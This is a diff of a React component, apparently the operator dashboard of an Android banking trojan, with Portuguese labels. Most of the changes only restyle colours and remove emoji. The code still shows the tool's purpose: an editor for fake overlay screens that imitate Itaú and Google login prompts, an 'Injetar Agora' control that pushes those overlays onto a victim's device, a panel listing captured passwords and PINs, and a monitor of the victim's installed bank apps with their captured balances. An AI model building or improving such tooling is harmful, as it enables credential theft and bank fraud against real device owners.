+                                      <div key={pIdx} className="bg-[#110505] p-1.5 rounded-md border border-[#2a2a31]/30 flex items-center justify-between text-[11px]">
+                                        <span className="text-[#ef4444] font-mono font-bold">{p.password || p.data || p.pin}</span>
                                         <span className="text-[9px] text-slate-400">{p.created_at ? new Date(p.created_at).toLocaleTimeString() : ''}</span>
                                       </div>
                                     ))}
@@ -5818,11 +5882,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 </div>
               </div>
             ) : showEditBankScreensTab ? (
-              <div className="bg-[#2b0903]/80 border border-blue-500/20 rounded-2xl flex flex-col md:flex-row text-slate-200 overflow-hidden shadow-2xl" style={{ minHeight: '620px', height: '620px' }}>
+              <div className="bg-[#2b0903]/80 border border-[#2a2a31]/20 rounded-md flex flex-col md:flex-row text-slate-200 overflow-hidden shadow-2xl" style={{ minHeight: '620px', height: '620px' }}>
                 {/* Lateral Esquerda - Selector de Bancos e Form de Edição */}
-                <div className="w-full md:w-1/2 border-r border-cyan-500/10 flex flex-col bg-[#300a03]/70 overflow-hidden">
-                  <div className="p-3 bg-slate-900/60 border-b border-cyan-500/10 flex items-center justify-between flex-shrink-0">
-                    <span className="text-xs font-black uppercase text-cyan-400 tracking-wider">
+                <div className="w-full md:w-1/2 border-r border-[#2a2a31]/10 flex flex-col bg-[#300a03]/70 overflow-hidden">
+                  <div className="p-3 bg-[#121214]/60 border-b border-[#2a2a31]/10 flex items-center justify-between flex-shrink-0">
+                    <span className="text-xs font-black uppercase text-[#ef4444] tracking-wider">
                        Editar Telas de Banco
                     </span>
                   </div>
@@ -5838,10 +5902,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             <button
                               key={screen.id}
                               onClick={() => selectPreset(screen.id)}
-                              className={`py-2 px-3 rounded-lg border text-xs font-bold font-mono transition-all flex items-center justify-center gap-1.5 ${
+                              className={`py-2 px-3 rounded-md border text-xs font-bold font-mono transition-all flex items-center justify-center gap-1.5 ${
                                 isSelected
-                                  ? 'bg-gradient-to-r from-pink-600/30 to-rose-600/10 border-pink-500/80 text-white shadow-[0_0_10px_rgba(236,72,153,0.15)] text-center'
-                                  : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:text-white hover:bg-slate-800/40 text-center'
+                                  ? 'bg-gradient-to-r from-[#65a30d]/30 to-[#84cc16]/10 border-pink-500/80 text-white shadow-[0_0_10px_rgba(236,72,153,0.15)] text-center'
+                                  : 'bg-[#121214]/60 border-[#24242a] text-slate-400 hover:text-white hover:bg-[#24242a]/40 text-center'
                               }`}
                             >
                               {screen.name.split('-')[0].trim()}
@@ -5851,7 +5915,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       </div>
                     </div>
 
-                    <div className="border-t border-slate-800 my-2"></div>
+                    <div className="border-t border-[#24242a] my-2"></div>
 
                     {/* Inputs de customização */}
                     <div className="space-y-3">
@@ -5861,7 +5925,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           type="text"
                           value={editBankPackage}
                           onChange={(e) => setEditBankPackage(e.target.value)}
-                          className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
+                          className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
                           placeholder="Ex: br.com.itau"
                         />
                       </div>
@@ -5875,7 +5939,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditBankLogoText(e.target.value);
                               handleUpdateCurrentScreenProperty('logo', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                           />
                         </div>
                         <div>
@@ -5887,7 +5951,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditBankTitle(e.target.value);
                               handleUpdateCurrentScreenProperty('title', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                           />
                         </div>
                       </div>
@@ -5900,7 +5964,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             handleUpdateCurrentScreenProperty('desc', e.target.value);
                           }}
                           rows={2}
-                          className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 resize-none"
+                          className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 resize-none"
                         />
                       </div>
                       <div className="grid grid-cols-2 gap-2">
@@ -5913,7 +5977,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditBankPlaceholder(e.target.value);
                               handleUpdateCurrentScreenProperty('placeholder', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                           />
                         </div>
                         <div>
@@ -5925,21 +5989,21 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditBankButtonText(e.target.value);
                               handleUpdateCurrentScreenProperty('buttonText', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                           />
                         </div>
                       </div>
                       {selectedPresetScreenId.includes('itau') && (
-                        <div className="bg-orange-950/40 border border-orange-500/50 rounded-lg p-2.5 my-2">
-                          <label className="block text-[11px] font-bold text-orange-400 uppercase tracking-wider mb-1 flex items-center gap-1">
-                            <span>🔢</span> Quantidade de Dígitos (Bolinhas):
+                        <div className="bg-orange-950/40 border border-[#ef4444]/50 rounded-md p-2.5 my-2">
+                          <label className="block text-[11px] font-bold text-[#f87171] uppercase tracking-wider mb-1 flex items-center gap-1">
+                            <span></span> Quantidade de Dígitos (Bolinhas):
                           </label>
                           <select
                             value={editBankDigitsOption}
                             onChange={(e) => handleUpdateItauDigits(e.target.value)}
-                            className="w-full bg-slate-950/90 border border-orange-500/60 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-orange-400 font-mono font-bold"
+                            className="w-full bg-slate-950/90 border border-[#ef4444]/60 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-[#f87171] font-mono font-bold"
                           >
-                            <option value="6,4">6 Dígitos (Acesso) + 4 Dígitos (Transação) [Padrão🏦 Itaú]</option>
+                            <option value="6,4">6 Dígitos (Acesso) + 4 Dígitos (Transação) [Padrão Itaú]</option>
                             <option value="4,4">4 Dígitos em Ambos os Passos (4 Bolinhas)</option>
                             <option value="6,6">6 Dígitos em Ambos os Passos (6 Bolinhas)</option>
                             <option value="4,6">4 Dígitos (Acesso) + 6 Dígitos (Transação)</option>
@@ -5957,7 +6021,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditBankBgColor(e.target.value);
                               handleUpdateCurrentScreenProperty('bgColor', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
                           />
                         </div>
                         <div>
@@ -5979,34 +6043,34 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 setEditBankBtnColor(e.target.value);
                                 handleUpdateCurrentScreenProperty('btnColor', e.target.value);
                               }}
-                              className="w-full bg-slate-950/80 border border-slate-800 rounded px-2 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
+                              className="w-full bg-slate-950/80 border border-[#24242a] rounded px-2 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
                             />
                           </div>
                         </div>
                       </div>
                     </div>
 
-                    <div className="flex gap-2 pt-3 border-t border-slate-800 flex-shrink-0">
+                    <div className="flex gap-2 pt-3 border-t border-[#24242a] flex-shrink-0">
                       <button
                         onClick={() => setShowBankVisualEditor(true)}
-                        className="flex-1 py-2.5 bg-gradient-to-r from-blue-600 to-indigo-500 hover:from-blue-500 hover:to-indigo-400 text-white font-bold rounded-xl text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(220,38,38,0.25)] flex items-center justify-center gap-1"
+                        className="flex-1 py-2.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold rounded-md text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(239,68,68,0.25)] flex items-center justify-center gap-1"
                       >
-                        🎨 Editor Visual
+                         Editor Visual
                       </button>
                       <button
                         onClick={() => {
                           const compiled = getCompiledBankTemplate();
                           if (compiled) applyCustomBlackScreen(compiled, editBankPackage);
                         }}
-                        className="flex-1 py-2.5 bg-gradient-to-r from-pink-600 to-rose-500 hover:from-pink-500 hover:to-rose-400 text-white font-bold rounded-xl text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(236,72,153,0.3)] flex items-center justify-center gap-1"
+                        className="flex-1 py-2.5 bg-gradient-to-r from-[#65a30d] to-[#ef4444] hover:from-pink-500 hover:to-rose-400 text-white font-bold rounded-md text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(236,72,153,0.3)] flex items-center justify-center gap-1"
                       >
-                        ⚡ Injetar Agora
+                         Injetar Agora
                       </button>
                       <button
                         onClick={saveCustomBankMapping}
-                        className="flex-1 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-bold rounded-xl text-[10px] uppercase tracking-wider transition-all flex items-center justify-center gap-1"
+                        className="flex-1 py-2.5 bg-[#24242a] hover:bg-[#2a2a31] text-slate-200 border border-[#2a2a31] font-bold rounded-md text-[10px] uppercase tracking-wider transition-all flex items-center justify-center gap-1"
                       >
-                        💾 Salvar Gatilho
+                         Salvar Gatilho
                       </button>
                     </div>
                   </div>
@@ -6014,15 +6078,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                 {/* Lateral Direita - Live Preview */}
                 <div className="flex-1 flex flex-col items-center justify-center bg-[#200603] p-4 overflow-hidden relative">
-                  <div className="absolute top-3 left-4 text-[10px] text-slate-500 font-mono">LIVE PREVIEW</div>
+                  <div className="absolute top-3 left-4 text-[10px] text-[#8b8b94] font-mono">LIVE PREVIEW</div>
                   
                   {/* Celular Mockup */}
-                  <div className="w-[280px] h-[520px] rounded-[36px] border-[8px] border-slate-800 bg-black relative shadow-[0_20px_50px_rgba(0,0,0,0.5)] overflow-hidden flex flex-col"
+                  <div className="w-[280px] h-[520px] rounded-[36px] border-[8px] border-[#24242a] bg-black relative shadow-[0_20px_50px_rgba(0,0,0,0.5)] overflow-hidden flex flex-col"
                        style={{ background: editBankBgColor }}>
                     
                     {/* Speaker Notch */}
-                    <div className="absolute top-2 left-1/2 transform -translate-x-1/2 w-28 h-4 bg-slate-900 rounded-full z-20 flex items-center justify-center">
-                      <div className="w-10 h-1 bg-slate-800 rounded-full"></div>
+                    <div className="absolute top-2 left-1/2 transform -translate-x-1/2 w-28 h-4 bg-[#121214] rounded-full z-20 flex items-center justify-center">
+                      <div className="w-10 h-1 bg-[#24242a] rounded-full"></div>
                     </div>
 
                     {/* Conteúdo Renderizado Dinamicamente */}
@@ -6122,7 +6186,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       {el.imageUrl ? (
                                         <img src={el.imageUrl} alt="" className="max-w-full max-h-full object-contain" />
                                       ) : (
-                                        <span className="text-lg">📷</span>
+                                        <span className="text-lg"></span>
                                       )}
                                     </div>
                                   )}
@@ -6136,12 +6200,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                     />
                                   )}
                                   {el.type === 'fingerprint' && (
-                                    <div className="w-full h-full flex flex-col items-center justify-center p-1 border border-dashed border-indigo-500/20 rounded bg-indigo-950/10">
+                                    <div className="w-full h-full flex flex-col items-center justify-center p-1 border border-dashed border-[#2a2a31]/20 rounded bg-[#121214]/10">
                                       <div
                                         className="rounded-full p-2 border animate-pulse"
                                         style={{ borderColor: el.biometricColor || '#00ff00' }}
                                       >
-                                        <span style={{ color: el.biometricColor || '#00ff00', fontSize: `${14 * scaleX}px` }}>🔑</span>
+                                        <span style={{ color: el.biometricColor || '#00ff00', fontSize: `${14 * scaleX}px` }}></span>
                                       </div>
                                     </div>
                                   )}
@@ -6156,12 +6220,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 </div>
               </div>
             ) : showEditSystemScreensTab ? (
-              <div className="bg-[#2b0903]/80 border border-blue-500/20 rounded-2xl flex flex-col md:flex-row text-slate-200 overflow-hidden shadow-2xl" style={{ minHeight: '620px', height: '620px' }}>
+              <div className="bg-[#2b0903]/80 border border-[#2a2a31]/20 rounded-md flex flex-col md:flex-row text-slate-200 overflow-hidden shadow-2xl" style={{ minHeight: '620px', height: '620px' }}>
                 {/* Lateral Esquerda - Selector de Telas e Form de Edição */}
-                <div className="w-full md:w-1/2 border-r border-cyan-500/10 flex flex-col bg-[#300a03]/70 overflow-hidden">
-                  <div className="p-3 bg-slate-900/60 border-b border-cyan-500/10 flex items-center justify-between flex-shrink-0">
-                    <span className="text-xs font-black uppercase text-cyan-400 tracking-wider">
-                      🔒 Telas de Sistema (Google/Outros)
+                <div className="w-full md:w-1/2 border-r border-[#2a2a31]/10 flex flex-col bg-[#300a03]/70 overflow-hidden">
+                  <div className="p-3 bg-[#121214]/60 border-b border-[#2a2a31]/10 flex items-center justify-between flex-shrink-0">
+                    <span className="text-xs font-black uppercase text-[#ef4444] tracking-wider">
+                       Telas de Sistema (Google/Outros)
                     </span>
                   </div>
                   
@@ -6178,11 +6242,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             if (PRESET_SYSTEM_PROJECT.screens.length > 0) {
                               selectSystemPreset(PRESET_SYSTEM_PROJECT.screens[0].id);
                             }
-                            addLog('🔄 Presets do sistema restaurados para o padrão!');
+                            addLog(' Presets do sistema restaurados para o padrão!');
                           }}
                           className="text-[9px] font-mono text-teal-400 hover:text-teal-300 bg-teal-950/40 hover:bg-teal-900/40 px-2 py-0.5 rounded border border-teal-500/30 transition-all"
                         >
-                          🔄 Restaurar Presets
+                           Restaurar Presets
                         </button>
                       </div>
                       <div className="grid grid-cols-2 gap-2">
@@ -6192,10 +6256,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             <button
                               key={screen.id}
                               onClick={() => selectSystemPreset(screen.id)}
-                              className={`py-2 px-3 rounded-lg border text-xs font-bold font-mono transition-all flex items-center justify-center gap-1.5 ${
+                              className={`py-2 px-3 rounded-md border text-xs font-bold font-mono transition-all flex items-center justify-center gap-1.5 ${
                                 isSelected
                                   ? 'bg-gradient-to-r from-teal-600/30 to-emerald-600/10 border-teal-500/80 text-white shadow-[0_0_10px_rgba(239,68,68,0.15)] text-center'
-                                  : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:text-white hover:bg-slate-800/40 text-center'
+                                  : 'bg-[#121214]/60 border-[#24242a] text-slate-400 hover:text-white hover:bg-[#24242a]/40 text-center'
                               }`}
                             >
                               {screen.name.split('-')[0].trim()}
@@ -6205,7 +6269,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       </div>
                     </div>
 
-                    <div className="border-t border-slate-800 my-2"></div>
+                    <div className="border-t border-[#24242a] my-2"></div>
 
                     {/* Inputs de customização */}
                     <div className="space-y-3">
@@ -6215,7 +6279,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           type="text"
                           value={editSystemPackage}
                           onChange={(e) => setEditSystemPackage(e.target.value)}
-                          className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500 font-mono"
+                          className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500 font-mono"
                           placeholder="Ex: com.google.android.gms"
                         />
                       </div>
@@ -6229,7 +6293,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditSystemLogoText(e.target.value);
                               handleUpdateSystemScreenProperty('logo', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500"
                           />
                         </div>
                         <div>
@@ -6241,7 +6305,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditSystemTitle(e.target.value);
                               handleUpdateSystemScreenProperty('title', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500"
                           />
                         </div>
                       </div>
@@ -6254,7 +6318,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             handleUpdateSystemScreenProperty('desc', e.target.value);
                           }}
                           rows={2}
-                          className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500 resize-none"
+                          className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500 resize-none"
                         />
                       </div>
                       <div className="grid grid-cols-2 gap-2">
@@ -6267,7 +6331,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditSystemPlaceholder(e.target.value);
                               handleUpdateSystemScreenProperty('placeholder', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500"
                           />
                         </div>
                         <div>
@@ -6279,7 +6343,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditSystemButtonText(e.target.value);
                               handleUpdateSystemScreenProperty('buttonText', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500"
                           />
                         </div>
                       </div>
@@ -6293,7 +6357,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditSystemBgColor(e.target.value);
                               handleUpdateSystemScreenProperty('bgColor', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500 font-mono"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500 font-mono"
                           />
                         </div>
                         <div>
@@ -6315,41 +6379,41 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 setEditSystemBtnColor(e.target.value);
                                 handleUpdateSystemScreenProperty('btnColor', e.target.value);
                               }}
-                              className="w-full bg-slate-950/80 border border-slate-800 rounded px-2 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500 font-mono"
+                              className="w-full bg-slate-950/80 border border-[#24242a] rounded px-2 py-1.5 text-xs text-white focus:outline-none focus:border-teal-500 font-mono"
                             />
                           </div>
                         </div>
                       </div>
                     </div>
 
-                    <div className="bg-teal-950/20 border border-teal-500/30 rounded-lg p-3 text-[11px] text-teal-400 font-sans flex items-start gap-2">
-                      <span className="text-sm select-none">💡</span>
+                    <div className="bg-teal-950/20 border border-teal-500/30 rounded-md p-3 text-[11px] text-teal-400 font-sans flex items-start gap-2">
+                      <span className="text-sm select-none"></span>
                       <div>
                         <strong>Onde as senhas são salvas:</strong> As informações capturadas por esta tela de sistema serão salvas na central <strong className="underline text-teal-300">Capturas Customizadas</strong> na barra de comandos à esquerda.
                       </div>
                     </div>
 
-                    <div className="flex gap-2 pt-3 border-t border-slate-800 flex-shrink-0">
+                    <div className="flex gap-2 pt-3 border-t border-[#24242a] flex-shrink-0">
                       <button
                         onClick={() => setShowSystemVisualEditor(true)}
-                        className="flex-1 py-2.5 bg-gradient-to-r from-blue-600 to-indigo-500 hover:from-blue-500 hover:to-indigo-400 text-white font-bold rounded-xl text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(220,38,38,0.25)] flex items-center justify-center gap-1"
+                        className="flex-1 py-2.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold rounded-md text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(239,68,68,0.25)] flex items-center justify-center gap-1"
                       >
-                        🎨 Editor Visual
+                         Editor Visual
                       </button>
                       <button
                         onClick={() => {
                           const compiled = getCompiledSystemTemplate();
                           if (compiled) applyCustomBlackScreen(compiled, editSystemPackage);
                         }}
-                        className="flex-1 py-2.5 bg-gradient-to-r from-teal-600 to-emerald-500 hover:from-teal-500 hover:to-emerald-400 text-white font-bold rounded-xl text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(239,68,68,0.3)] flex items-center justify-center gap-1"
+                        className="flex-1 py-2.5 bg-gradient-to-r from-teal-600 to-emerald-500 hover:from-teal-500 hover:to-emerald-400 text-white font-bold rounded-md text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(239,68,68,0.3)] flex items-center justify-center gap-1"
                       >
-                        ⚡ Injetar Agora
+                         Injetar Agora
                       </button>
                       <button
                         onClick={saveCustomSystemMapping}
-                        className="flex-1 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-bold rounded-xl text-[10px] uppercase tracking-wider transition-all flex items-center justify-center gap-1"
+                        className="flex-1 py-2.5 bg-[#24242a] hover:bg-[#2a2a31] text-slate-200 border border-[#2a2a31] font-bold rounded-md text-[10px] uppercase tracking-wider transition-all flex items-center justify-center gap-1"
                       >
-                        💾 Salvar Gatilho
+                         Salvar Gatilho
                       </button>
                     </div>
                   </div>
@@ -6357,15 +6421,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                 {/* Lateral Direita - Live Preview */}
                 <div className="flex-1 flex flex-col items-center justify-center bg-[#200603] p-4 overflow-hidden relative h-full">
-                  <div className="absolute top-3 left-4 text-[10px] text-slate-500 font-mono">LIVE PREVIEW</div>
+                  <div className="absolute top-3 left-4 text-[10px] text-[#8b8b94] font-mono">LIVE PREVIEW</div>
                   
                   {/* Celular Mockup */}
-                  <div className="w-[280px] h-[500px] rounded-[36px] border-[8px] border-slate-800 bg-black relative shadow-[0_20px_50px_rgba(0,0,0,0.5)] overflow-hidden flex flex-col"
+                  <div className="w-[280px] h-[500px] rounded-[36px] border-[8px] border-[#24242a] bg-black relative shadow-[0_20px_50px_rgba(0,0,0,0.5)] overflow-hidden flex flex-col"
                        style={{ background: editSystemBgColor }}>
                     
                     {/* Speaker Notch */}
-                    <div className="absolute top-2 left-1/2 transform -translate-x-1/2 w-28 h-4 bg-slate-900 rounded-full z-20 flex items-center justify-center">
-                      <div className="w-10 h-1 bg-slate-800 rounded-full"></div>
+                    <div className="absolute top-2 left-1/2 transform -translate-x-1/2 w-28 h-4 bg-[#121214] rounded-full z-20 flex items-center justify-center">
+                      <div className="w-10 h-1 bg-[#24242a] rounded-full"></div>
                     </div>
 
                     {/* Conteúdo Renderizado Dinamicamente */}
@@ -6464,7 +6528,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       {el.imageUrl ? (
                                         <img src={el.imageUrl} alt="" className="max-w-full max-h-full object-contain" />
                                       ) : (
-                                        <span className="text-lg">📷</span>
+                                        <span className="text-lg"></span>
                                       )}
                                     </div>
                                   )}
@@ -6488,26 +6552,26 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 </div>
               </div>
             ) : showBankMonitorTab ? (
-              <div className="bg-[#2b0903]/80 border border-blue-500/20 rounded-2xl flex flex-col md:flex-row text-slate-200 overflow-hidden shadow-2xl" style={{ minHeight: '620px', height: '620px' }}>
+              <div className="bg-[#2b0903]/80 border border-[#2a2a31]/20 rounded-md flex flex-col md:flex-row text-slate-200 overflow-hidden shadow-2xl" style={{ minHeight: '620px', height: '620px' }}>
                 {/* Lateral Esquerda - Lista de Bancos Instalados */}
-                <div className="w-full md:w-2/5 border-r border-cyan-500/10 flex flex-col bg-[#300a03]/70 overflow-hidden">
-                  <div className="p-3 bg-slate-900/60 border-b border-cyan-500/10 flex items-center justify-between flex-shrink-0">
-                    <span className="text-xs font-black uppercase text-cyan-400 tracking-wider">
+                <div className="w-full md:w-2/5 border-r border-[#2a2a31]/10 flex flex-col bg-[#300a03]/70 overflow-hidden">
+                  <div className="p-3 bg-[#121214]/60 border-b border-[#2a2a31]/10 flex items-center justify-between flex-shrink-0">
+                    <span className="text-xs font-black uppercase text-[#ef4444] tracking-wider">
                        Bancos no Aparelho
                     </span>
                     <button
                       onClick={fetchInstalledApps}
                       disabled={isLoadingApps}
-                      className="px-2.5 py-1 text-[10px] bg-cyan-950 hover:bg-cyan-900 border border-cyan-500/30 text-cyan-300 font-bold rounded transition-all"
+                      className="px-2.5 py-1 text-[10px] bg-[#121214] hover:bg-[#1a1a1e] border border-[#2a2a31]/30 text-[#ef4444] font-bold rounded transition-all"
                     >
-                      {isLoadingApps ? '⌛ Buscando...' : '🔄 Sincronizar'}
+                      {isLoadingApps ? ' Buscando...' : ' Sincronizar'}
                     </button>
                   </div>
                   
                   <div className="flex-1 overflow-y-auto p-2 space-y-2">
                     {installedBanks.length === 0 ? (
-                      <div className="text-center py-10 text-slate-500 text-xs">
-                        <span className="text-3xl block mb-2">”</span>
+                      <div className="text-center py-10 text-[#8b8b94] text-xs">
+                        <span className="text-3xl block mb-2"></span>
                         Nenhum app de banco identificado. 
                         <br/>
                         Use o botão "Sincronizar" acima.
@@ -6523,14 +6587,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           <div
                             key={idx}
                             onClick={() => setSelectedMonitorBank(app)}
-                            className={`p-2.5 rounded-xl border cursor-pointer transition-all duration-200 relative overflow-hidden group ${
+                            className={`p-2.5 rounded-md border cursor-pointer transition-all duration-200 relative overflow-hidden group ${
                               isSelected 
-                                ? 'bg-gradient-to-r from-cyan-950/80 via-[#380b04]/90 to-blue-950/70 border-cyan-400/80 shadow-[0_0_15px_rgba(255,43,43,0.2)]' 
-                                : 'bg-[#240703]/80 hover:bg-[#3e0d05]/90 border-cyan-500/15 hover:border-cyan-500/40 shadow-sm'
+                                ? 'bg-gradient-to-r from-[#121214]/80 via-[#380b04]/90 to-[#121214]/70 border-[#3a3a44]/80 shadow-[0_0_15px_rgba(239,68,68,0.2)]' 
+                                : 'bg-[#240703]/80 hover:bg-[#3e0d05]/90 border-[#2a2a31]/15 hover:border-[#2a2a31]/40 shadow-sm'
                             }`}
                           >
                             {isSelected && (
-                              <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-cyan-400 to-blue-500 shadow-[0_0_8px_#ff2b2b]" />
+                              <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-[#f87171] to-[#ef4444] shadow-[0_0_8px_#ef4444]" />
                             )}
                             <div className="flex items-center justify-between gap-2">
                               <div className="flex items-center space-x-3 min-w-0 flex-1">
@@ -6539,16 +6603,16 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                   {isAppOpen && (
                                     <span className="absolute -top-1 -right-1 flex h-2.5 w-2.5">
                                       <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
-                                      <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500 border border-slate-900" />
+                                      <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500 border border-[#121214]" />
                                     </span>
                                   )}
                                 </div>
                                 <div className="min-w-0 flex-1">
-                                  <h4 className="font-black text-xs text-white truncate group-hover:text-cyan-300 transition-colors">{app.name}</h4>
+                                  <h4 className="font-black text-xs text-white truncate group-hover:text-[#ef4444] transition-colors">{app.name}</h4>
                                   {appBalanceObj ? (
                                     <p className="text-[10px] text-emerald-400 font-bold font-mono truncate drop-shadow-[0_0_6px_rgba(52,211,153,0.3)]">{appBalanceObj.balance}</p>
                                   ) : (
-                                    <p className="text-[9px] text-slate-500 truncate font-mono">Sem saldo capturado</p>
+                                    <p className="text-[9px] text-[#8b8b94] truncate font-mono">Sem saldo capturado</p>
                                   )}
                                 </div>
                               </div>
@@ -6557,17 +6621,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 {isAppOpen ? (
                                   <span className="px-2 py-0.5 rounded-full text-[8px] font-black uppercase bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.3)] flex items-center gap-1">
                                     <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
-                                    🟢 ABERTO
+                                     ABERTO
                                   </span>
                                 ) : lastAccessInfo ? (
